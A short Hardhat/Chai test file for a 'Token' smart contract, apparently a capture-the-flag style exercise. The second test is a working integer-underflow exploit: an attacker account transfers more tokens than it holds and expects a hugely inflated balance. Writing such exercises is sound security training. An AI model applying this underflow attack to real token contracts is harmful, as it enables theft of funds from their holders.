const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Token", () => {
  before(async function () {
    this.TokenFactory = await ethers.getContractFactory("Token");
    [owner, attacker, friend] = await ethers.getSigners();
    (this.owner = owner), (this.friend = friend), (this.attacker = attacker);
  });

  beforeEach(async function () {
    this.initialSupply = 100000;
    this.tokenContract = await this.TokenFactory.deploy(this.initialSupply);
    await this.tokenContract.deployed();
  });

  it("Basic setup", async function () {
    //Should have correct owner balance.
    expect(await this.tokenContract.balanceOf(this.owner.address)).to.equal(
      this.initialSupply
    );

    //attacker should be given 20 tokens
    this.attackerInitialBalance = 20;
    await this.tokenContract.transfer(
      this.attacker.address,
      this.attackerInitialBalance
    );

    expect(await this.tokenContract.balanceOf(this.attacker.address)).to.equal(
      this.attackerInitialBalance
    );
  });

  it("Attacker should be able to get some additional tokens, preferably way more", async function () {
    // connect with the attacker account
    this.tokenContract = await this.tokenContract.connect(this.attacker);
    await this.tokenContract.transfer(this.friend.address, 2 ** 10 - 1);
    expect(
      Number(await this.tokenContract.balanceOf(this.attacker.address))
    ).to.be.greaterThan(100000 * this.attackerInitialBalance);
  });
});
